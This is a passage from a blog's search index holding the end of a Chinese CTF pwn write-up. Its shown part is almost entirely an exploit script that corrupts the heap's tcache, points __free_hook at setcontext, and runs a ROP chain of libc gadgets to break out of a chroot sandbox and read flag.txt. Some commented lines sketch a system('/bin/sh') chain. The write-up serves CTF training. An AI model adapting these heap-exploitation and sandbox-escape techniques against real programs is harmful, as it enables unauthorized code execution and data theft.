class="line">__malloc_hook = lib.symbols[<span class="string">b&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc + <span class="number">0x00000000000215bf</span><span class="comment">#0x000000000002155f</span></span><br><span class="line">pop_rsi_ret = libc + <span class="number">0x0000000000023eea</span><span class="comment">#0x0000000000023e8a</span></span><br><span class="line">pop_rdx_ret = libc + <span class="number">0x0000000000001b96</span><span class="comment">#0x0000000000001b96</span></span><br><span class="line">pop_rdx_rsi_ret = libc + <span class="number">0x0000000000130569</span><span class="comment">#0x0000000000130889</span></span><br><span class="line">ret = libc + <span class="number">0x00000000000008aa</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x38</span>)  <span class="comment"># 7</span></span><br><span class="line">free(<span class="number">6</span>)  <span class="comment"># ???</span></span><br><span class="line"><span class="comment"># 0x60 : tcache 0x40</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,p64(heap_base + <span class="number">0x60</span>) + <span class="string">&quot;\n&quot;</span>,<span class="string">&quot;flag.txt\x00&quot;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>) + p64(<span class="number">0x3c0</span> + heap_base) + p64(ret) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># heap_base+0x60 :tcache struct 0x40 chunk head</span></span><br><span class="line"><span class="comment"># setcontext data</span></span><br><span class="line"><span class="comment"># rsp:heap_base+0x3c0:chunk5</span></span><br><span class="line"><span class="comment"># rip:ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x48</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x48</span>)  <span class="comment"># 8</span></span><br><span class="line">edit(<span class="number">8</span>, p64(<span class="number">0xdeadbeef</span>) + <span class="string">&quot;\n&quot;</span>, p64(lib.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># fix tcache 0x40</span></span><br><span class="line">edit(<span class="number">4</span>, p64(<span class="number">0x0800000000010000</span>) + <span class="string">&quot;\n&quot;</span>, p64(<span class="number">0xdeadbeef</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite free_hook</span></span><br><span class="line">log.info(<span class="string">&quot;setcontext:&quot;</span>+<span class="built_in">hex</span>(lib.sym[<span class="string">&#x27;setcontext&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x48</span>)  <span class="comment"># 9</span></span><br><span class="line">edit(<span class="number">9</span>, p64(lib.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span>) + <span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># creat read</span></span><br><span class="line">edit(<span class="number">5</span>, p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_rsi_ret) + p64(<span class="number">0x1000</span>) +</span><br><span class="line">     p64(heap_base + <span class="number">0x3b0</span>) + p64(lib.sym[<span class="string">&#x27;read&#x27;</span>])+<span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x40</span>-<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(dir_fd)</span><br><span class="line">payload += p64(lib.sym[<span class="string">&#x27;fchdir&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(heap_base+<span class="number">0x4c0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(lib.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rdx_rsi_ret) + p64(<span class="number">0x100</span>) + p64(heap_base+<span class="number">0x440</span>)</span><br><span class="line">payload += p64(lib.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdx_rsi_ret) + p64(<span class="number">0x100</span>) + p64(heap_base+<span class="number">0x400</span>)</span><br><span class="line">payload += p64(lib.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"><span class="comment"># payload += p64(pop_rdi_ret) + p64(binsh)</span></span><br><span class="line"><span class="comment"># payload += p64(ret)</span></span><br><span class="line"><span class="comment"># payload += p64(system)</span></span><br><span class="line">sl(payload)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># sl(&quot;echo deadbeef &amp;&amp; cd ../ &amp;&amp; cat flag.txt&quot;)</span></span><br><span class="line"><span class="comment"># ru(&quot;deadbeef&quot;)</span></span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://blog.eonew.cn/archives/993">setcontext 函数exploit</a></p><p><a href="https://blog.csdn.net/qq_43116977/article/details/107580414">DASCTF 7月部分pwn</a></p><p><a href="http://www.jx-zhang.xyz/2019/12/29/chroot_jail">chroot jail break in CTF from 0 to -1</a></p><p>[高校战“疫”网络安全分享赛pwn部分wp]</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 沙盒 </tag>
            
            <tag> 堆溢出 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
